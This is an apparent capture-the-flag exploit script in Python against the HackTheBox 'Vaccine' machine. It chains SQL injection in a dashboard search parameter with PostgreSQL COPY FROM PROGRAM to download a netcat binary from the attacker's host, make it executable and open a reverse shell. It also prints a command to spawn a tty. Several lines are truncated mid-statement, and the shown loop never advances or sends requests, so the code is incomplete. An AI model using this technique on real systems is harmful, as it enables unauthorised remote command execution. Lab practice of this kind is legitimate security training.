import requests
import random


your_cookie="9niv51ftvh8bgjqkf1irsd0a39"      #CHANGE ME !
your_IP="10.10.14.27"                        #CHANGE ME !
your_web_port="80"                            #CHANGE ME !
your_nc_port_listener="4444"                  #CHANGE ME !
your_nc_PATH="nc"                             #CHANGE ME ! --> The path to the nc e>
'''
Autor: Florianges
This script exploit the SQL injection in the CTF vaccine on HTB
This script sends an nc executable to the server and runs it to generate a reverse >You must start a web server to host the executable nc --> exemple : sudo python -m >And you must run a nc listener --> exemple: nc -lvp 4444
Then you can execute this script with python3
Note: The nc executable hosted on your web server must be GNU nc (and therefore mus>'''


nb_random = str(random.randint(1,100000))
i=0

cmd = ['DROP TABLE IF EXISTS cmd_'+nb_random,
       'CREATE TABLE cmd_'+ nb_random  +'(cmd_output text)',
       'COPY cmd_'+ nb_random +' FROM PROGRAM \'wget -P /tmp/'+ nb_random +' http:/>       'COPY cmd_'+ nb_random +' FROM PROGRAM \'chmod 777 /tmp/'+ nb_random  +'/nc\>       'COPY cmd_'+ nb_random +' FROM PROGRAM \'/tmp/' + nb_random  +'/nc '+ your_I>
while (i<=len(cmd)-1):
  url = "http://10.10.10.46/dashboard.php?search=a';"+ cmd[i]  +"; -- -"
  cookies = {'PHPSESSID': your_cookie}
  print("Payload --> " + url)
  if(i==4):
    print("All the payload is send, check your nc processus")
    print("You can spawn tty with this command: SHELL=/bin/bash script -q /dev/null>
